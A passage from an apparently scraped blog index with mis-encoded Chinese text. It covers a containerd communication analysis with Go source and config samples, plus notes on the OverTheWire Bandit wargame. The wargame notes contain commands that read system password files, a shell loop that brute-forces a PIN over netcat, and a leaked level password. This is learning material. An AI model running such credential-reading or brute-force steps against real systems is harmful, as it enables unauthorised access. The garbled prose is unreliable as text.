nil { return nil, err } return out, nil } 3ã€shimæ”¶åˆ°è¯·æ±‚å¹¶è°ƒç”¨å¤„ç†å‡½æ•°\ncontainerd/api/runtime/task/v3/shim_grpc.pb.go\nfunc _Task_Create_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(CreateTaskRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TaskServer).Create(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.task.v3.Task/Create\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TaskServer).Create(ctx, req.(*CreateTaskRequest)) } return interceptor(ctx, in, info, handler) } func _Task_Start_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(StartRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TaskServer).Start(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.task.v3.Task/Start\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TaskServer).Start(ctx, req.(*StartRequest)) } return interceptor(ctx, in, info, handler) } 3ã€å®é™…è°ƒç”¨çš„å¤„ç†å‡½æ•°\ncontainerd/cmd/containerd-shim-runc-v2/task/service.go\nfunc (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } // Start a process func (s *service) Start(ctx context.Context, r *taskAPI.StartRequest) (*taskAPI.StartResponse, error) { container, err := s.getContainer(r.ID) if err != nil { return nil, err } var cinit *runc.Container s.lifecycleMu.Lock() if r.ExecID == \u0026#34;\u0026#34; { cinit = container } else { if _, initExited := s.containerInitExit[container]; initExited { s.lifecycleMu.Unlock() return nil, errdefs.ToGRPCf(errdefs.ErrFailedPrecondition, \u0026#34;container %s init process is not running\u0026#34;, container.ID) } s.runningExecs[container]++ } handleStarted, cleanup := s.preStart(cinit) s.lifecycleMu.Unlock() defer cleanup() p, err := container.Start(ctx, r) if err != nil { // If we failed to even start the process, s.runningExecs // won\u0026#39;t get decremented in s.handleProcessExit. We still need // to update it. if r.ExecID != \u0026#34;\u0026#34; { s.lifecycleMu.Lock() s.runningExecs[container]-- if ch, ok := s.execCountSubscribers[container]; ok { ch \u0026lt;- s.runningExecs[container] } s.lifecycleMu.Unlock() } handleStarted(container, p) return nil, errdefs.ToGRPC(err) } switch r.ExecID { case \u0026#34;\u0026#34;: switch cg := container.Cgroup().(type) { case cgroup1.Cgroup: if err := s.ep.Add(container.ID, cg); err != nil { log.G(ctx).WithError(err).Error(\u0026#34;add cg to OOM monitor\u0026#34;) } case *cgroupsv2.Manager: allControllers, err := cg.RootControllers() if err != nil { log.G(ctx).WithError(err).Error(\u0026#34;failed to get root controllers\u0026#34;) } else { if err := cg.ToggleControllers(allControllers, cgroupsv2.Enable); err != nil { if userns.RunningInUserNS() { log.G(ctx).WithError(err).Debugf(\u0026#34;failed to enable controllers (%v)\u0026#34;, allControllers) } else { log.G(ctx).WithError(err).Errorf(\u0026#34;failed to enable controllers (%v)\u0026#34;, allControllers) } } } if err := s.ep.Add(container.ID, cg); err != nil { log.G(ctx).WithError(err).Error(\u0026#34;add cg to OOM monitor\u0026#34;) } } s.send(\u0026amp;eventstypes.TaskStart{ ContainerID: container.ID, Pid: uint32(p.Pid()), }) default: s.send(\u0026amp;eventstypes.TaskExecStarted{ ContainerID: container.ID, ExecID: r.ExecID, Pid: uint32(p.Pid()), }) } handleStarted(container, p) return \u0026amp;taskAPI.StartResponse{ Pid: uint32(p.Pid()), }, nil } é—®é¢˜ä¸è§£ç­” 1ã€containerdçš„ gRPC ç›®å‰å¯ç”¨åŠ è§£å¯†ä¿æŠ¤é€šä¿¡ä¸å¦ï¼Ÿæ˜¯å¦æœ‰åŒå‘è®¤è¯ï¼Ÿ\nç­”ï¼šåœ¨ containerd ä¸­ï¼ŒgRPC çš„åŠ å¯†æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶ä¸­çš„ TLS è®¾ç½®å®ç°çš„ã€‚ä½ å¯ä»¥åœ¨ containerd çš„é…ç½®æ–‡ä»¶ /etc/containerd/config.toml ä¸­é…ç½® TLS ç›¸å…³çš„é€‰é¡¹ã€‚\nåœ¨ config.toml æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥ä¸º gRPC æœåŠ¡å¯ç”¨ TLSï¼š\n[grpc] address = \u0026#34;/run/containerd/containerd.sock\u0026#34; # å¼€å¯TCPç›‘å¬ï¼Œé»˜è®¤æ˜¯å…³é—­çš„ tcp_address = \u0026#34;0.0.0.0:2375\u0026#34; # é…ç½®TLSè¯ä¹¦å’Œå¯†é’¥ tls_cert = \u0026#34;/etc/containerd/tls/containerd.crt\u0026#34; tls_key = \u0026#34;/etc/containerd/tls/containerd.key\u0026#34; # å¯é€‰çš„ï¼ŒCAè¯ä¹¦è·¯å¾„ tls_ca = \u0026#34;/etc/containerd/tls/ca.crt\u0026#34; tls_cert å’Œ tls_key æ˜¯æœåŠ¡å™¨çš„è¯ä¹¦å’Œç§é’¥æ–‡ä»¶ï¼Œcontainerd å°†ä½¿ç”¨è¿™äº›æ–‡ä»¶æ¥åŠ å¯† gRPC é€šä¿¡ã€‚\ntls_ca æ˜¯å¯é€‰çš„ CA è¯ä¹¦ï¼Œç”¨äºéªŒè¯å®¢æˆ·ç«¯è¯ä¹¦ï¼Œä»è€Œæ”¯æŒåŒå‘è®¤è¯ï¼ˆMutual TLS, mTLSï¼‰ã€‚\n2ã€2.1.4ä¸­æåˆ°â€œæ’ä»¶é€šè¿‡ gRPC æä¾›æœåŠ¡æ¥å£ï¼Œcontainerd æ ¸å¿ƒé€šè¿‡è°ƒç”¨è¿™äº›æ¥å£æ¥ç®¡ç†é•œåƒã€å¿«ç…§å’Œå®¹å™¨è¿è¡Œæ—¶ç­‰â€ã€‚ æ˜¯å¦æ„å‘³ç€containerdä¸æ’ä»¶ä¹‹é—´ä¹Ÿæ˜¯ä½¿ç”¨gRPCè¿›è¡Œçš„é€šä¿¡ï¼Ÿä¹Ÿå°±æ˜¯containerdå†…éƒ¨ä¹Ÿæœ‰gRPCé€šä¿¡ï¼Ÿ\nç­”ï¼šcontainerdå†…éƒ¨åº”è¯¥ä¸æ˜¯gRPCé€šä¿¡ï¼ŒgRPCæ˜¯ä¸€ä¸ªRPCé€šä¿¡æ¡†æ¶ï¼Œä¸€èˆ¬ç”¨äºè¿›ç¨‹é—´ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨gRPCæ²¡æœ‰å¤ªå¤§çš„å¿…è¦ï¼Œä¸€ä¸ªè¿›ç¨‹å†…éƒ¨å„æ¨¡å—çš„é€šä¿¡åº”è¯¥æ˜¯é€šè¿‡æ¥å£å’Œç›´æ¥çš„å‡½æ•°è°ƒç”¨æ¥å®ç°å†…éƒ¨é€šä¿¡çš„ã€‚\n3ã€2.1.4 ä»¥åŠ 3.1 åˆ†åˆ«æåˆ°ï¼šâ€œå®ˆæŠ¤è¿›ç¨‹ä¸å¤–éƒ¨å®¢æˆ·ç«¯ï¼ˆå¦‚ ctr å·¥å…·æˆ– Docker å¼•æ“ï¼‰ä¹‹é—´çš„é€šä¿¡ â€ä½¿ç”¨ gRPC/UDS ï¼Ÿ ç‰¹åˆ«æ˜¯ 3.1 å¦‚ä½•ç†è§£ï¼Ÿ3.1 åé¢æåˆ°ä¸€ä¸ªä¾‹å­ï¼ŒDockerå¼•æ“é€šè¿‡ gRPC è¿æ¥åˆ°å®ˆæŠ¤è¿›ç¨‹çš„UDSåœ°å€ï¼Œä»¥è¯·æ±‚ç®¡ç†å®¹å™¨ã€é•œåƒã€å¿«ç…§ç­‰æ“ä½œã€‚é—®ï¼šgRPC å¦‚ä½•è¿æ¥çš„è¿™ä¸ª UDS åœ°å€ï¼ˆæŠ€æœ¯åŸç†ï¼‰ï¼Ÿ\nç­”ï¼šè¿™ä¸ªé—®é¢˜ç†è§£çš„å…³é”®ç‚¹åœ¨äºudsæ˜¯å¦‚ä½•ä¸gRPCç»“åˆä½¿ç”¨çš„ï¼Œcontainerdåœ¨æœåŠ¡å¯åŠ¨çš„æ—¶å€™ä½¿ç”¨ sys.GetLocalListener æ¥ç›‘å¬ä¸€ä¸ª Unix Domain Socketã€‚ç„¶åå°†ç›‘å¬å™¨ä¼ é€’ç»™ serveå‡½æ•°å¤„ç†grpcè¯·æ±‚ã€‚ï¼ˆå…·ä½“çš„ä»£ç å¯ä»¥åœ¨4.1ä¸­æ‰¾åˆ°ï¼‰\n4ã€åˆ›å»ºçš„å®¹å™¨çš„æ‰€å± userã€group é»˜è®¤æ˜¯ä¸containerd åŒç»„åŒç”¨æˆ·å—ï¼Ÿ\nç­”ï¼šæˆ‘åœ¨è¿™ä¸ªé—®é¢˜ä¸Šåšäº†ä¸€äº›å®éªŒæ¥éªŒè¯ã€‚é¦–å…ˆï¼Œåˆ›å»ºçš„å®¹å™¨çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„è‚¯å®šæ˜¯å¯ä»¥è®¾ç½®çš„ï¼Œæ— è®ºæ˜¯åœ¨é•œåƒä¸­æŒ‡å®šï¼Œè¿˜æ˜¯åœ¨åˆ›å»ºå®¹å™¨çš„æ—¶å€™æŒ‡å®šï¼›ä½†é»˜è®¤ä¸æŒ‡å®šçš„æƒ…å†µä¸‹é•œåƒä¸€èˆ¬éƒ½æ˜¯å°†å®¹å™¨å†…çš„è¿›ç¨‹è®¾ç½®ä¸ºä»¥rootç”¨æˆ·è¿›è¡Œã€‚è¿™ä¹Ÿå°è¯äº†ä¸‹é¢è¿™å¥è¯ï¼šåœ¨ containerd ä¸­ï¼Œåˆ›å»ºçš„å®¹å™¨é»˜è®¤æƒ…å†µä¸‹ä¸ä¼šè‡ªåŠ¨ç»§æ‰¿ containerd è¿›ç¨‹çš„ç”¨æˆ·ï¼ˆuserï¼‰å’Œç»„ï¼ˆgroupï¼‰ã€‚ç›¸åï¼Œå®¹å™¨çš„ç”¨æˆ·å’Œç»„æ˜¯æ ¹æ®å®¹å™¨çš„é…ç½®ï¼ˆå¦‚ OCI è§„èŒƒï¼‰æ¥å†³å®šçš„ã€‚\nä¸‹é¢æ˜¯æˆ‘ä½¿ç”¨containerdåˆ›å»ºalpineæœåŠ¡å®¹å™¨çš„æƒé™çš„é…ç½®æ–‡ä»¶ï¼š\n5ã€3.3 æåˆ°â€œæ’ä»¶å¯èƒ½ä½œä¸ºå¤–éƒ¨æœåŠ¡è¿è¡Œï¼Œéœ€è¦é€šè¿‡ UDS ä¸ containerd é€šä¿¡ã€‚â€ï¼Œä¾‹å­ä»‹ç»ä¸­è¯´ï¼šâ€œå¤–éƒ¨å­˜å‚¨æ’ä»¶å¯èƒ½ç‹¬ç«‹è¿è¡Œå¹¶é€šè¿‡ UDS æš´éœ²å…¶ gRPC æœåŠ¡ï¼Œcontainerd é€šè¿‡è¿æ¥è¿™ä¸ª UDS æ¥è°ƒç”¨æ’ä»¶çš„æœåŠ¡ã€‚â€ é—®ï¼šcontainerd é€šè¿‡ UDS è¿æ¥å¤–éƒ¨æ’ä»¶ï¼Œå¤–éƒ¨æ’ä»¶æš´éœ²çš„ gRPC ç»™è°ï¼Ÿ\nç­”ï¼šè¿™æ˜¯containerdå®˜æ–¹æ–‡æ¡£æŸ¥åˆ°çš„ï¼Œcontainerdé€šè¿‡gRPCè¿æ¥å¤–éƒ¨æ’ä»¶ï¼Œé‚£å¤–éƒ¨æ’ä»¶æš´éœ²çš„gRPCè‚¯å®šæ˜¯ç»™containerdçš„é…ç½®æ–‡ä»¶ã€‚\n6ã€systemd æä¾›ä½¿ç”¨socket activationtæœºåˆ¶ï¼Œæ˜¯é’ˆå¯¹å†…æ ¸æ€è¿›ç¨‹è¿˜æ˜¯ç”¨æˆ·æ€è¿›ç¨‹ï¼Œäº¦æˆ–æ˜¯ä¸¤è€…éƒ½æ”¯æŒï¼Ÿ\nç­”ï¼šé’ˆå¯¹ç”¨æˆ·æ€è¿›ç¨‹ã€‚\n7ã€containerdçš„socketæ–‡ä»¶çš„modeå’Œuidã€gidåˆ†åˆ«æ˜¯ï¼Ÿç”±è°è®¾ç½®è¯¥å†…å®¹ï¼Ÿ\nç­”ï¼šå…·ä½“å›ç­”å¯ä»¥çœ‹é—®é¢˜9ï¼Œè‡³äºsocketæ–‡ä»¶çš„modeã€uidã€gidçš„è®¾ç½®è‚¯å®šæ˜¯ç”±containerdè‡ªå·±è®¾ç½®ï¼Œå…·ä½“å¯çœ‹æºç ã€‚\n//é¦–å…ˆä¼ å…¥config.tomlä¸­è®¾ç½®çš„gidï¼Œuid [ttrpc] address = \u0026#34;\u0026#34; gid = 0 uid = 0 //æ¥ç€è°ƒç”¨GetLocalListener tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) //å†åˆ›å»ºsocketæ–‡ä»¶ï¼Œä¹‹åè°ƒç”¨chmodä¸º0660ï¼Œchownä¸ºä¸Šé¢ä¼ å…¥çš„gidã€uid func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } 8ã€rootæƒé™ä¸‹ï¼šcontainerdã€shimä»¥åŠå®¹å™¨çš„UIDã€GIDæ˜¯å¦éƒ½ä¸€æ ·ï¼Ÿå¦‚ä½•è®¾ç½®å®¹å™¨ä¸åŒçš„UIDã€GID\nç­”ï¼šrootæƒé™ä¸‹containerdã€shimçš„UIDã€GIDéƒ½æ˜¯root\nhacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ ps -eo pid,user,group,comm | grep containerd 248 root root containerd 8561 root root containerd-shim 13295 root root containerd-shim å¦‚ä½•è®¾ç½®å®¹å™¨ä¸åŒçš„uidã€gidï¼Œå¯ä»¥åœ¨containerdåˆ›å»ºå®¹å™¨æ—¶æŒ‡å®šç”¨æˆ·åŠç”¨æˆ·ç»„ï¼Œæ¯”å¦‚æˆ‘çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„éƒ½æ˜¯1000ï¼Œæˆ‘å¯ä»¥è¿™ä¹ˆåˆ›å»ºå®¹å™¨ã€‚\nhacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ sudo ctr container create -u 1000:1000 m.daocloud.io/docker.io/library/alpine:latest mycont ainer è¿›å…¥å®¹å™¨åæŸ¥çœ‹id\nhacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ sudo ctr task exec -t --exec-id exec-1 mycontainer /bin/sh ~ $ id uid=1000 gid=1000 groups=1000 9ã€å¦‚æœç”¨systemdå¯åŠ¨containerdå®ˆæŠ¤è¿›ç¨‹ä»¥åŠç”¨äºä¸containerdé€šä¿¡çš„clientè¿›ç¨‹ï¼Œé‚£ä¹ˆsocketæ–‡ä»¶æ˜¯ç”±systemdåˆ›å»ºè¿˜æ˜¯containerdåˆ›å»ºï¼Ÿ\nå¦‚æœä½¿ç”¨ systemd æ¥å¯åŠ¨ containerd å®ˆæŠ¤è¿›ç¨‹ä»¥åŠç”¨äºä¸ containerd é€šä¿¡çš„å®¢æˆ·ç«¯è¿›ç¨‹ï¼Œå¹¶ä¸”å¯ç”¨äº† socket activation æœºåˆ¶ï¼ˆå¯ä»¥ä¸å¯åŠ¨ï¼‰ï¼Œé‚£ä¹ˆ socket æ–‡ä»¶å°†ç”± systemd åˆ›å»ºï¼Œè€Œä¸æ˜¯ containerdã€‚\nï¼ˆäº‹å®ä¸Šcontainerdåº”è¯¥æ˜¯ä¸æ”¯æŒsystemdçš„socket activationæœºåˆ¶çš„ï¼Œgithubä¹Ÿæœ‰äººæå‡ºè¿‡åœ¨containerdä¸­åŠ å…¥æ­¤æœºåˆ¶ï¼šadd socket activation Â· Issue #164 Â· containerd/containerd (github.com)ï¼‰\nä¸€èˆ¬å¦‚æœæ”¯æŒsocket activationæœºåˆ¶çš„è¯ä¼šæœ‰ç±»ä¼¼ä¸‹å›¾çš„é€»è¾‘ï¼ŒæœåŠ¡å™¨ä¼šå…ˆè°ƒç”¨sd_listen_fdså‡½æ•°ï¼Œçœ‹systemdæ˜¯å¦åˆ›å»ºäº†socketæ–‡ä»¶ï¼Œå¦‚æœåˆ›å»ºäº†å°±ä¸ä¼šå†åˆ›å»ºäº†ã€‚æ‰€ä»¥å¦‚æœä½¿ç”¨systemçš„socket activationå¯åŠ¨è¿›ç¨‹ï¼Œé‚£ä¹ˆå°±ä¸€å®šæ˜¯systemdåˆ›å»ºsocketæ–‡ä»¶ã€‚\nå…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š\nsystemd åˆ›å»º socketï¼šåœ¨ socket activation æœºåˆ¶ä¸‹ï¼Œsystemd ä¼šé¦–å…ˆæ ¹æ®é…ç½®åˆ›å»ºä¸€ä¸ªç›‘å¬ socket æ–‡ä»¶ï¼Œå¹¶å°†å…¶ç½®äºç›‘å¬çŠ¶æ€ã€‚è¿™æ˜¯åœ¨ containerd å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨ä¹‹å‰å®Œæˆçš„ã€‚ systemd å¯åŠ¨ containerdï¼šå½“æœ‰å®¢æˆ·ç«¯è¿æ¥åˆ°ç”± systemd åˆ›å»ºçš„ socket æ—¶ï¼Œsystemd æ£€æµ‹åˆ°è¿æ¥è¯·æ±‚å¹¶å¯åŠ¨ containerd å®ˆæŠ¤è¿›ç¨‹ï¼Œå¹¶å°†è¿™ä¸ª socket ä¼ é€’ç»™ containerdã€‚ containerd ä½¿ç”¨ socketï¼šcontainerd å¯åŠ¨åï¼Œæ¥æ”¶ systemd ä¼ é€’çš„ socketï¼Œå¹¶ä½¿ç”¨è¯¥ socket æ¥å¤„ç†å®¢æˆ·ç«¯çš„é€šä¿¡è¯·æ±‚ã€‚ ä¸ºäº†æ›´å¥½çš„ç†è§£ä¸ºä»€ä¹ˆæ˜¯systemdåˆ›å»ºæˆ‘ä»¬å†™ä¸€ä¸ªä½¿ç”¨ systemd å¯åŠ¨ containerd å®ˆæŠ¤è¿›ç¨‹å’Œå®¢æˆ·ç«¯è¿›ç¨‹çš„æµç¨‹ï¼š\n1ã€åˆ›å»º systemd çš„ socket å•å…ƒæ–‡ä»¶\nä½ éœ€è¦ä¸º containerd åˆ›å»ºä¸€ä¸ª .socket å•å…ƒæ–‡ä»¶ï¼Œé€šå¸¸æ”¾åœ¨ /etc/systemd/system/containerd.socket æˆ– /usr/lib/systemd/system/containerd.socketã€‚\nç¤ºä¾‹å¦‚ä¸‹ï¼š\n[Unit] Description=containerd Socket [Socket] ListenStream=/run/containerd/containerd.sock SocketMode=0660 [Install] WantedBy=sockets.target 2ã€åˆ›å»º systemd çš„ service å•å…ƒæ–‡ä»¶\nä½ éœ€è¦ç¡®ä¿ containerd çš„ .service å•å…ƒæ–‡ä»¶æ­£ç¡®é…ç½®ã€‚å¦‚æœé»˜è®¤çš„ service æ–‡ä»¶ä¸æ”¯æŒ socket activationï¼Œä½ å¯èƒ½éœ€è¦æä¾›ä¸€ä¸ªè‡ªå®šä¹‰çš„ service æ–‡ä»¶ã€‚æ”¾åœ¨ /etc/systemd/system/containerd.service æˆ– /usr/lib/systemd/system/containerd.serviceã€‚\nç¤ºä¾‹å¦‚ä¸‹ï¼š\n[Unit] Description=containerd container runtime Documentation=https://containerd.io Wants=network-online.target After=network-online.target [Service] ExecStart=/usr/bin/containerd Type=notify Restart=always LimitNOFILE=1048576 LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process OOMScoreAdjust=-999 ExecStartPre=-/sbin/modprobe overlay ExecReload=/bin/kill -s HUP $MAINPID KillSignal=SIGTERM TimeoutStartSec=0 [Install] WantedBy=multi-user.target 3ã€å¯ç”¨å¹¶å¯åŠ¨ socket å’Œ service\nå¯ç”¨å¹¶å¯åŠ¨ socket å’Œ serviceï¼š\nsudo systemctl enable containerd.socket sudo systemctl start containerd.socket æ­¤æ—¶ï¼Œsystemd ä¼šç›‘å¬ /run/containerd/containerd.sockï¼Œå¹¶åœ¨æœ‰å®¢æˆ·ç«¯è¿æ¥æ—¶è‡ªåŠ¨å¯åŠ¨ containerd æœåŠ¡ã€‚\n10ã€OCI æ ‡å‡†æ˜¯ä»€ä¹ˆï¼Ÿ\nOCIï¼ˆOpen Container Initiativeï¼‰ æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæ—¨åœ¨å®šä¹‰å®¹å™¨è¿è¡Œæ—¶å’Œé•œåƒçš„æ ‡å‡†ã€‚å®ƒç”± Linux Foundation ç»„ç»‡ä¸»å¯¼ï¼Œä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªå…³é”®è§„èŒƒï¼š\nOCI Runtime Specificationï¼ˆOCI è¿è¡Œæ—¶è§„èŒƒï¼‰ï¼š è¿™ä¸ªè§„èŒƒå®šä¹‰äº†å®¹å™¨çš„è¿è¡Œæ—¶è¡Œä¸ºï¼ŒåŒ…æ‹¬å¦‚ä½•åˆ›å»ºã€é…ç½®ã€å¯åŠ¨ã€åœæ­¢å’Œåˆ é™¤å®¹å™¨ã€‚å®ƒå®šä¹‰äº†å®¹å™¨ç”Ÿå‘½å‘¨æœŸçš„å„ä¸ªé˜¶æ®µï¼Œä»¥åŠå®¹å™¨è¿›ç¨‹çš„ç¯å¢ƒã€å‘½åç©ºé—´ã€cgroups ç­‰é…ç½®ã€‚ OCI Image Specificationï¼ˆOCI é•œåƒè§„èŒƒï¼‰ï¼š è¿™ä¸ªè§„èŒƒå®šä¹‰äº†å®¹å™¨é•œåƒçš„æ ¼å¼åŠå…¶å†…å®¹ã€‚è¿™åŒ…æ‹¬å¦‚ä½•æ‰“åŒ…åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–é¡¹ï¼Œä»¥ä¾¿é•œåƒå¯ä»¥è¢«å„ç§å®¹å™¨è¿è¡Œæ—¶æ‹‰å–å’Œè§£å‹ï¼Œä»¥ä¸€è‡´çš„æ–¹å¼è¿è¡Œã€‚ 11ã€ä¸ºä»€ä¹ˆcontainerdæœ€ç»ˆè°ƒç”¨çš„æ˜¯net.listen()åˆ›å»ºsocketæ–‡ä»¶ï¼Ÿ\nå› ä¸ºnet.listen()è°ƒç”¨çš„æ˜¯Goæ ‡å‡†åº“netåŒ…ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼ŒGoå¯¹åº•å±‚udsçš„syscallåšäº†ä¸€ä¸ªå°è£…ï¼Œå®é™…åˆ›å»ºsocketæ–‡ä»¶è¿˜æ˜¯bindé˜¶æ®µï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹netçš„å®ç°ï¼Œæˆ‘ç¨å¾®çœ‹äº†ä¸€ä¸‹æºç ç¡®å®æ˜¯åšäº†å°è£…ã€‚\nå‚è€ƒèµ„æ–™ containerd-shimæ–‡æ¡£\n","date":"2024-10-23T00:00:00Z","image":"https://chenyuan1125.github.io/p/containerd%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/1_hu2969935857509030280.jpg","permalink":"https://chenyuan1125.github.io/p/containerd%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/","title":"containerdé€šä¿¡æœºåˆ¶åˆ†æ"},{"content":"å‚è€ƒåšå®¢ï¼šOverTheWire: Level Goal: Bandit Level 12 â†’ Level 13\nlevel12-13 ä¸»è¦æ€è·¯ï¼š å…ˆå°†æ–‡ä»¶è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå†åˆ©ç”¨fileå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œæ ¹æ®æ–‡ä»¶ç±»å‹æ¥è§£å‹ç¼©\nlevel17-18 åˆ©ç”¨diff -a\nlevel18-19 The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.\nssh -p 2220 bandit18@bandit.labs.overthewire.org cat readme level19-20 setuidï¼Œåˆ©ç”¨bandit20.doæ–‡ä»¶æ¥ææƒroot\n./bandit20-do cat /etc/bandit_pass/bandit20 level20-21 åˆ©ç”¨nc -lv ç›‘å¬ç«¯å£ï¼Œå†ç”¨./suconnect ç«¯å£å·è¿æ¥\nlevel21-22 æ‰¾åˆ°å¯¹åº”çš„crondè„šæœ¬\nlevel22-23 æ‰¾åˆ°å¯¹åº”è„šæœ¬,å†æŠŠbandit23çš„mytargetæ‰¾å‡ºæ¥ï¼Œå†è¯»å–å¯†ç \nbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d \u0026#39; \u0026#39; -f 1 level23-24 æ‰¾åˆ°å¯¹åº”è„šæœ¬ï¼Œå‚è€ƒä¸Šä¸€ä¸ªlevelçš„è„šæœ¬ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„è„šæœ¬æ¥è·å–å¯†ç ï¼Œæ³¨æ„æ–‡ä»¶çš„æƒé™é—®é¢˜\n#!/bin/bash cat /etc/bandit_pass/bandit24 \u0026gt; /tmp/bandit24/bandit24 level24-25 Level Goal\nA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time\ntipsï¼š nc localhost 30002 åˆ©ç”¨shellè„šæœ¬è¿›è¡Œçˆ†ç ´\næ³¨æ„ç¨‹åºå¯èƒ½ä¼šå› ä¸ºè¶…æ—¶å¡ä½ï¼Œæ‰€ä»¥è¦åˆ†æ®µçˆ†ç ´\nfor i in {0000..9999} do echo \u0026#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i\u0026#34; \u0026gt;\u0026gt; ./banditpin done cat ./banditpin | nc localhost 30002 \u0026gt;\u0026gt; ./bandit25pass level25-26 Level Goal\nLogging in to bandit26 from bandit25 should be fairly easyâ€¦ The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.\nå‚è€ƒåšå®¢ï¼šOverTheWire Bandit Level 25 -\u0026gt; 26 - Walkthrough - MayADevBe Blog\nlså‘ç°ç›®å½•ä¸‹æœ‰bandit26çš„ç§é’¥ï¼Œå°è¯•ä½¿ç”¨ssh -i è¿›è¡Œè¿æ¥ï¼Œè¿æ¥å¤±è´¥ï¼Œç”±äº/bin/bashè¢«ä¿®æ”¹ã€‚\nåˆ©ç”¨cat /etc/passwdæŸ¥çœ‹bandit26æ‰€ä½¿ç”¨çš„shellï¼Œå‘ç°ä¸º/usr/bin/showtextï¼Œå†æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°å®ƒæ˜¯ä¸ªè„šæœ¬ï¼Œå¹¶ä¸”é€šè¿‡moreæ‰“å¼€äº†text.txtæ–‡ä»¶ï¼Œ\nbandit25@bandit:~$ cat /etc/passwd | grep bandit26 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ ls -la /usr/bin/showtext -rwxr-xr-x 1 root root 53 May 7 2020 /usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 å†æ¬¡å°è¯•sshè¿æ¥ï¼Œå¤±è´¥\n$ ssh -i bandit26.sshkey bandit26@localhost ... _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| / / \u0026#39;_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to bandit.labs.overthewire.org closed. åˆ†æåŸå› ï¼Œå¦‚æœtext.txtæ–‡ä»¶è¶…è¿‡ä¸€é¡µï¼Œé‚£ä¹ˆmore 